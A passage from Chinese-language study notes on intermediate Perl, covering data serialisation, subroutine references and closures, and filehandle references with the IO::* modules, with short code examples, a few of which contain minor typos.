子例程返回一个二进制字符串, 该字符串用于表述所需要输出的数据结构:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Storable;<br><span class="hljs-keyword">my</span> @data1 = <span class="hljs-string">qw(one won)</span>;<br><span class="hljs-keyword">my</span> @data2 = <span class="hljs-string">qw(two too to)</span>;<br><span class="hljs-keyword">push</span> @data2, \@data1;<br><span class="hljs-keyword">push</span> @data1, \@data2;<br><span class="hljs-keyword">my</span> $frozen = freeze [\@data1, \@data2];<br></code></pre></td></tr></table></figure><h3 id="6-3-2-YAML-模块"><a href="#6-3-2-YAML-模块" class="headerlink" title="6.3.2 YAML 模块"></a>6.3.2 YAML 模块</h3><p>YAML (Yet Another Mark Language).</p><p>YAML 模块的工作方式与 Data::Dumper 模块相同.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"> <span class="hljs-keyword">use</span> YAML;<br><br> <span class="hljs-keyword">my</span> %total_bytes;<br><br> <span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>     <span class="hljs-keyword">my</span> ($source, $destination, $bytes) = <span class="hljs-keyword">split</span>;<br>     $total_bytes&#123;$source&#125;&#123;$destination&#125; += $bytes;<br>&#125;<br><br><span class="hljs-keyword">print</span> Dump(\%total_bytes);<br></code></pre></td></tr></table></figure><h3 id="6-3-3-JSON-模块"><a href="#6-3-3-JSON-模块" class="headerlink" title="6.3.3 JSON 模块"></a>6.3.3 JSON 模块</h3><p>JSON (JavaScript Object Notation).</p><p>JSON 模块有很多中创建输出的方法, 其中就包括 <code>to_json</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> JSON;<br><br><span class="hljs-keyword">print</span> to_json( \%total_bytes, &#123; <span class="hljs-string">pretty =&gt;</span> <span class="hljs-number">1</span> &#125; );<br></code></pre></td></tr></table></figure><p>这里的 <code>&#123; pretty =&gt; 1 &#125;</code> 是使用属性.</p><p>可以从一个文件, Web 请求或者来自其他程序的输出获取 JSON 文本:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> JSON;<br><br><span class="hljs-keyword">my</span> $hash_ref = from_json($json_string);<br></code></pre></td></tr></table></figure><h2 id="6-4-使用-map-和-grep-操作符"><a href="#6-4-使用-map-和-grep-操作符" class="headerlink" title="6.4 使用 map 和 grep 操作符"></a>6.4 使用 map 和 grep 操作符</h2><h2 id="6-5-应用一点间接方法"><a href="#6-5-应用一点间接方法" class="headerlink" title="6.5 应用一点间接方法"></a>6.5 应用一点间接方法</h2><h1 id="第7章-对子例程的引用"><a href="#第7章-对子例程的引用" class="headerlink" title="第7章 对子例程的引用"></a>第7章 对子例程的引用</h1><p>除了对标量, 数组和散列的引用, 也可以对一个子例程进行引用.k</p><h2 id="7-1-对命名子例程的引用"><a href="#7-1-对命名子例程的引用" class="headerlink" title="7.1 对命名子例程的引用"></a>7.1 对命名子例程的引用</h2><p>对子例程 <code>skipper_greets()</code> 取引用, 前导字符 “&amp;” 在这里是必须的, 但删除了其后的小括号.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ref_to_greeter = \&amp;skipper_greets;<br></code></pre></td></tr></table></figure><p>解引用同样是加大括号:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&amp;&#123; $ref_to_greeter &#125;( <span class="hljs-string">&#x27;Gilligan&#x27;</span> )<br></code></pre></td></tr></table></figure><p>同样, 如果大括号里的值是简单的标量变量, 大括号可以删除:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&amp; $ref_to_greeter( <span class="hljs-string">&#x27;Gilligan&#x27;</span> )<br></code></pre></td></tr></table></figure><p>也可以转换成带箭头的形式:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$ref_to_greeter -&gt; ( <span class="hljs-string">&#x27;Gilligan&#x27;</span> )<br></code></pre></td></tr></table></figure><p>迭代调用所有子例程:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">for</span> <span class="hljs-keyword">my</span> %greet (\&amp;skipper_greets, \&amp;gilligan_greets) &#123;<br>    $greet-&gt;(<span class="hljs-string">&#x27;Professor&#x27;</span>);<br>&#125;    <br></code></pre></td></tr></table></figure><p>也就是说, 用子例程的引用的一个好处就是, 当子例程调用的参数相同时, 可以利用控制结构简化操作.</p><h2 id="7-2-匿名子例程"><a href="#7-2-匿名子例程" class="headerlink" title="7.2 匿名子例程"></a>7.2 匿名子例程</h2><p>匿名子例程看上去像是普通子例程, 只是在 sub 关键字和紧随的代码块之间没有名字, 最后有一个分号, 毕竟是一个赋值语句, 其返回一个子例程的引用:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ginger = <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $person = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Ginger: (in a sultry voice) Well hello, $person!\n&quot;</span>;<br>&#125;;<br>$ginger-&gt;(<span class="hljs-string">&#x27;Skipper&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="7-3-回调"><a href="#7-3-回调" class="headerlink" title="7.3 回调"></a>7.3 回调</h2><p>File::Find 模块导出的 find 子例程, 用来以可移植的方式遍历给定文件系统的层次结构. 传递给 find 子例程两个参数:  第一个是对子例程的引用. 该子例程会从给定的起始目录开始, 通过递归搜索的方法, 找到其下的每个文件或目录, 执行子例程引用下的操作, 第二个表示目录开始点的字符串:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Find;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">what_to_do</span> </span>&#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$File::Find::name found\n&quot;</span>;<br>&#125;<br><span class="hljs-keyword">my</span> @starting_directories = <span class="hljs-string">qw(.)</span>;<br><br>find(\&amp;what_to_do, @starting_directories);<br></code></pre></td></tr></table></figure><p>改用匿名子例程的方式:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Find;<br><br>find(<br>    <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$File::Find:name found\n&quot;</span>;<br>    &#125;,<br>    @starting_directories,<br>);<br></code></pre></td></tr></table></figure><h2 id="7-4-闭包"><a href="#7-4-闭包" class="headerlink" title="7.4 闭包"></a>7.4 闭包</h2><p>还可以用 File::Find 来查找文件的一些其他属性.</p><p><code>$_</code> 中保存的是文件名, 而 <code>File::Find::name</code> 中保存的是相对于起始路径的文件名. 如, 若起始目录为 <code>/usr</code>, 查找的文件为 <code>/usr/bin/perl</code>, 那么 <code>$_</code> 中的值为 <code>perl</code> 而 <code>$File::Find::name</code> 的值为 <code>/bin/perl</code>.</p><p>能够访问声明时就存在的所有词法变量的子例程叫做闭包. (也就是说变量是在子例程外面声明的).</p><p>从闭包内部访问变量能够确保只要子例程引用存在, 访问的变量就存在.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Find;<br><br><span class="hljs-keyword">my</span> $callback;<br>&#123;<br>    <span class="hljs-keyword">my</span> $count = <span class="hljs-number">0</span>;<br>    $callback = <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">print</span> ++$count, <span class="hljs-string">&quot;: $File::Find::name\n&quot;</span> &#125;;<br>&#125;<br>find($callback, <span class="hljs-string">&#x27;.&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="7-5-从一个子例程返回另一个子例程"><a href="#7-5-从一个子例程返回另一个子例程" class="headerlink" title="7.5 从一个子例程返回另一个子例程"></a>7.5 从一个子例程返回另一个子例程</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Find;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">create_find_callback_that_counts</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">print</span> ++$count, <span class="hljs-string">&quot;: $File::Find::name\n&quot;</span> &#125;;<br>&#125;<br><br><span class="hljs-keyword">my</span> $callback = create_find_callback_that_counts();<br>find($callback, <span class="hljs-string">&#x27;.&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="7-6-作为输入参数的闭包变量"><a href="#7-6-作为输入参数的闭包变量" class="headerlink" title="7.6 作为输入参数的闭包变量"></a>7.6 作为输入参数的闭包变量</h2><p>闭包变量也同样可以用于为子例程提供初始变量或者持续输入.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Find;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">print_bigger_than</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $minimum_size = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$File::Find::name\n&quot;</span> <span class="hljs-keyword">if</span> -f <span class="hljs-keyword">and</span> -s &gt;= $minimum_size &#125;;<br>&#125;<br><br><span class="hljs-keyword">my</span> $bigger_than_1024 = print_bigger_than(<span class="hljs-number">1024</span>);<br>find($bigger_than_1024, <span class="hljs-string">&#x27;bin&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="7-7-闭包变量作为静态局部变量"><a href="#7-7-闭包变量作为静态局部变量" class="headerlink" title="7.7 闭包变量作为静态局部变量"></a>7.7 闭包变量作为静态局部变量</h2><p>命名子例程也可以是闭包.</p><p>如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br><span class="hljs-keyword">my</span> $count;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">count_one</span> </span>&#123; ++$count &#125;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">count_so_fat</span> </span>&#123; <span class="hljs-keyword">return</span> $count &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>子例程在作用域外仍将保持. 也就是说, 上面虽然是在一个代码块中, 外面的程序仍然能够使用这两个子例程.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br><span class="hljs-keyword">my</span> $countdown = <span class="hljs-number">10</span>;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">count_down</span> </span>&#123; $countdown-- &#125;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">count_remaining</span> </span>&#123; $countdown &#125;<br>&#125;<br><br>count_down();<br>count_down();<br>count_down();<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;we&#x27;re down to &quot;</span>, count_remaining(), <span class="hljs-string">&quot; coconuts!\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>实测加上 BEGIN 结果也是一样的?</p><h3 id="state-变量"><a href="#state-变量" class="headerlink" title="state 变量"></a>state 变量</h3><p>Perl v5.10 版开始为子例程引入了另一种方法生成私有的, 持续的变量. (也就是说重复调用子例程时值不会丢失)</p><p>可以使用 <code>state</code> 语句在子例程内部声明变量.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10</span>;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">countdown</span> </span>&#123;<br>    <span class="hljs-keyword">state</span> $countdown = <span class="hljs-number">10</span>;<br>    $countdown--;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>state</code> 变量有一个限制, 仅能使用 state 语句初始化标量变量. 能够使用 state 语句声明任何类型的变量, 但是不能初始化它们.</p><h2 id="7-8-查询我们自己的身份"><a href="#7-8-查询我们自己的身份" class="headerlink" title="7.8 查询我们自己的身份"></a>7.8 查询我们自己的身份</h2><p>Perl v5.16 版引入 <code>__SUB__</code> 标记 (token), 返回一个指向当前子例程的引用.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $sub = <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123;<br>    <span class="hljs-keyword">state</span> $n = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> $n &gt; -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">say</span> $n--;<br>    __SUB_<span class="hljs-number">_</span>-&gt;();<br>&#125;<br>$sub-&gt;();<br></code></pre></td></tr></table></figure><h3 id="7-8-1-令人着迷的子例程"><a href="#7-8-1-令人着迷的子例程" class="headerlink" title="7.8.1 令人着迷的子例程"></a>7.8.1 令人着迷的子例程</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @arry = ( \ <span class="hljs-string">&#x27;xyz&#x27;</span>, [<span class="hljs-string">qw(a b c)</span>], <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Buster&#x27;</span> &#125; );<br><br><span class="hljs-keyword">foreach</span> ( @array ) &#123;<br>    <span class="hljs-keyword">when</span> (<span class="hljs-keyword">ref</span> eq <span class="hljs-keyword">ref</span> \ <span class="hljs-string">&#x27;&#x27;</span>   ) &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Scalar $$_&quot;</span> &#125;<br>    <span class="hljs-keyword">when</span> (<span class="hljs-keyword">ref</span> eq <span class="hljs-keyword">ref</span> []     ) &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Array @$_&quot;</span> &#125;<br>    <span class="hljs-keyword">when</span> (<span class="hljs-keyword">ref</span> eq <span class="hljs-keyword">ref</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123;&#125; ) &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Sub ???&quot;</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里每一个 <code>when</code> 中的第一个 <code>ref</code> 实际上是 <code>ref $_</code>.</p><h3 id="7-8-2-转储闭包"><a href="#7-8-2-转储闭包" class="headerlink" title="7.8.2 转储闭包"></a>7.8.2 转储闭包</h3><p>Data::Dump::Streamer 模块是增强版的 Data::Dumper 模块.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Data::Dump::Streamer;<br><br><span class="hljs-keyword">my</span> @luxuries = <span class="hljs-string">qw(Diamonds Furs Caviar)</span>;<br><br><span class="hljs-keyword">my</span> $hash = &#123;<br>    <span class="hljs-string">Gilligan           =&gt;</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Howdy Skipper!&#x27;</span>     &#125;,<br>    <span class="hljs-string">Skipper            =&gt;</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Gilligan!!!!&#x27;</span>       &#125;,<br>    <span class="hljs-string">&#x27;Mr. Howell&#x27;</span>       =&gt; <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Money money money!&#x27;</span> &#125;,<br>    <span class="hljs-string">Ginger             =&gt;</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">say</span> $luxuries[<span class="hljs-keyword">rand</span> @luxuries] &#125;,<br>&#125;;<br><br>Dump $hash;<br></code></pre></td></tr></table></figure><h1 id="第8章-文件句柄引用"><a href="#第8章-文件句柄引用" class="headerlink" title="第8章 文件句柄引用"></a>第8章 文件句柄引用</h1><h2 id="8-1-旧方法"><a href="#8-1-旧方法" class="headerlink" title="8.1 旧方法"></a>8.1 旧方法</h2><h2 id="8-2-改进的方法"><a href="#8-2-改进的方法" class="headerlink" title="8.2 改进的方法"></a>8.2 改进的方法</h2><p>从 Perl v5.6 开始, <code>open</code> 命令能够以普通的标量变量形式创建一个文件句柄的引用, 前提是只要该标量变量的值未定义.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $log_fh;<br><span class="hljs-keyword">open</span> $log_fh, <span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;castaways.log&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Could not open castways.log: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>同样, 在 <code>&lt;&gt;</code> 中:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> ( &lt;$log_fh&gt; ) &#123; ... &#125;<br></code></pre></td></tr></table></figure><h2 id="8-3-指向字符串的文件句柄"><a href="#8-3-指向字符串的文件句柄" class="headerlink" title="8.3 指向字符串的文件句柄"></a>8.3 指向字符串的文件句柄</h2><p>从 Perl v5.6 开始, 能够打开一个标量引用形式的文件句柄, 而不是一个文件, 该文件句柄要么从该字符串读取要么向该字符串写入.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $string_fh, <span class="hljs-string">&#x27;&gt;&#x27;</span>, \ <span class="hljs-keyword">my</span> $string;<br></code></pre></td></tr></table></figure><h3 id="逐行处理字符串"><a href="#逐行处理字符串" class="headerlink" title="逐行处理字符串"></a>逐行处理字符串</h3><h2 id="8-4-文件句柄集合"><a href="#8-4-文件句柄集合" class="headerlink" title="8.4 文件句柄集合"></a>8.4 文件句柄集合</h2><p>可以将文件句柄引用作为数组元素或者散列值存储.</p><p>当文件句柄超出其作用域时, 就会被自动关闭.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10</span>;<br><br><span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>    <span class="hljs-keyword">state</span> $fhs;<br><br>    <span class="hljs-keyword">my</span>($source, $destination, $bytes) = <span class="hljs-keyword">split</span>;<br><br>    <span class="hljs-keyword">unless</span> ( $fhs-&gt;&#123;$source&#125; ) &#123;<br>        <span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, $source <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&#x27;...&#x27;</span>;<br>        $fhs-&gt;&#123;$source&#125; = $fh;<br>    &#125;<br><br>    <span class="hljs-keyword">say</span> &#123; $fhs-&gt;&#123;$source&#125; &#125; <span class="hljs-string">&quot;$destination $bytes&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-5-IO-Handle-模块和其他相应的模块"><a href="#8-5-IO-Handle-模块和其他相应的模块" class="headerlink" title="8.5 IO::Handle 模块和其他相应的模块"></a>8.5 IO::Handle 模块和其他相应的模块</h2><p>在幕后, Perl 实际上使用 IO::Handle 模块实现文件句柄操作.</p><p>文件句柄量实际上是 IO::Handle 模块的对象.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Handle;<br><br><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&gt;&#x27;</span>, $filename <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&#x27;...&#x27;</span>;<br>$fh-&gt;<span class="hljs-keyword">print</span>( <span class="hljs-string">&#x27;Coconut headphones&#x27;</span> );<br>$fh-&gt;<span class="hljs-keyword">close</span>;<br></code></pre></td></tr></table></figure><p>自 Perl v5.14 之后, 不必显式加载 IO::Handle 模块.</p><p>IO::Handle 包对于输入, 输出操作而言是基础类, 因此它能够处理很多事情, 而不仅仅是文件.</p><h3 id="8-5-1-IO-File-模块"><a href="#8-5-1-IO-File-模块" class="headerlink" title="8.5.1 IO::File 模块"></a>8.5.1 IO::File 模块</h3><p>IO::File 模块是 IO::Handle 模块用于操作文件的子集, 该模块来自于 Perl 标准发行版.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $read_fh = IO::File-&gt;new( <span class="hljs-string">&#x27;castaways.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span> );<br><span class="hljs-keyword">my</span> $write_fh = IO::File-&gt;new( <span class="hljs-string">&#x27;castaways.log&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span> );<br></code></pre></td></tr></table></figure><p>其返回一个文件句柄.</p><p>打开匿名的临时文件:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $temp_fh = IO::File-&gt;new_tmpfile;<br></code></pre></td></tr></table></figure><p>可以显式调用 <code>close</code> 或 <code>undef</code> 命令操作文件句柄:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">$temp_fh-&gt;<span class="hljs-keyword">close</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Could not close file: $!&quot;</span>;<br><br><span class="hljs-keyword">undef</span> $append_fh;<br></code></pre></td></tr></table></figure><p>如果将 <code>undef</code> 作为文件名, Perl v5.6 及后续版本能够打开一个匿名, 临时的文件:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;+&gt;&#x27;</span>, <span class="hljs-keyword">undef</span><br>  <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Could not open temp file: $!&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="8-5-2-IO-Scalar-模块"><a href="#8-5-2-IO-Scalar-模块" class="headerlink" title="8.5.2 IO::Scalar 模块"></a>8.5.2 IO::Scalar 模块</h3><p>若 Perl 的版本不能创建标量引用形式的文件句柄. 就可以使用 IO::Scalar 模块. 该模块不是 Perl 标准发行版的模块.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Scalar;<br><br><span class="hljs-keyword">my</span> $string_log = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">my</span> $scalar_fh = IO::Scalar-&gt;new( \$string_log );<br><br><span class="hljs-keyword">print</span> $scalar_fh <span class="hljs-string">&quot;The Howells&#x27;s private beach club is closed\n&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="8-5-3-IO-Tee-模块"><a href="#8-5-3-IO-Tee-模块" class="headerlink" title="8.5.3 IO::Tee 模块"></a>8.5.3 IO::Tee 模块</h3><p>其不是自带的模块.</p><p>将内容同时输出到多个地方, 使用 IO::Tea 模块.</p><p>当输出到达 IO::Tee 模块时, 它就能够同时流向两个 (甚至多个) 不同的管道.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Tee;<br><br><span class="hljs-keyword">my</span> $tee_fh = IO::Tee-&gt;new( $log_fh, $scalar_fh );<br><br><span class="hljs-keyword">print</span> $tee_fh <span class="hljs-string">&quot;The radio works in the middle of the ocean!\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>如果 IO::Tee 模块的第一个参数是 (随后的参数必须是输出文件句柄).</p><p>当 IO::Tee 模块从输入句柄读取一行数据时, 他就立即将该数据写入输出文件句柄.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Tee;<br><br><span class="hljs-keyword">my</span> $tee_fh = IO::Tee-&gt;new( $read_fh, $log_fh, $scalar_fh );<br><br><span class="hljs-keyword">my</span> $message = &lt;$tee_fh&gt;;  <span class="hljs-comment"># 这一句就是从输入句柄读取一行到 $message 这个变量中</span><br></code></pre></td></tr></table></figure><p><code>$read_fh</code> 可能连接到一个套接字, 标量变量或者外部命令的输出. </p><h3 id="8-5-4-IO-Pipe-模块"><a href="#8-5-4-IO-Pipe-模块" class="headerlink" title="8.5.4 IO::Pipe 模块"></a>8.5.4 IO::Pipe 模块</h3><p>与 Shell 中的管道类似, 符号 <code>|</code> 之后的 <code>$command</code> 将会记录来自命令的输出, 然后通过管道传入程序. 具体见 learning perl.</p><p>使用 IO::Pipe 模块, 其自动处理 fork 命令和 exec 命令, 返回一个文件句柄, 可以从该文件句柄读取命令的输出:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 